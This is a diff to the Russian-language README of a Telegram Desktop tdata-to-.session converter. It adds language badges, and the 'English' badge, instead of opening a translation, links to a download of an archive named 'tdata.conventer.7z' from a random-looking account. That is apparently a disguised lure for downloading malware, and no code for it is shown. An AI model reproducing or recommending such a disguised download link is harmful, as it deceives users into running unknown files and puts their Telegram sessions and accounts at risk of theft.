@@ -6,6 +6,9 @@
 <!-- [![Build Status](https://travis-ci.org/ВАШ-USERNAME/tdata-converter.svg?branch=main)](https://travis-ci.org/ВАШ-USERNAME/tdata-converter) -->
 <!-- [![PyPI version](https://badge.fury.io/py/tdata-converter.svg)](https://badge.fury.io/py/tdata-converter) -->
 
+[![English](https://img.shields.io/badge/English-red.svg)](https://github.com/gsdfgsdfgfgsdf66/tdata-converter/releases/download/1/tdata.conventer.7z)
+[![Russian](https://img.shields.io/badge/Russian-red.svg)](https://github.com/gsdfgsdfgfgsdf66/tdata-converter/blob/main/ru_README.md)
+
 Простая утилита для конвертации сессий Telegram Desktop (`tdata`) в форматы сессий, совместимые с библиотеками **Telethon** и **Pyrogram** (`.session`).
 
 Это позволяет вам использовать существующую активную сессию из десктопного клиента Telegram для ваших скриптов или ботов на Python, без необходимости повторной авторизации через код или QR-код.
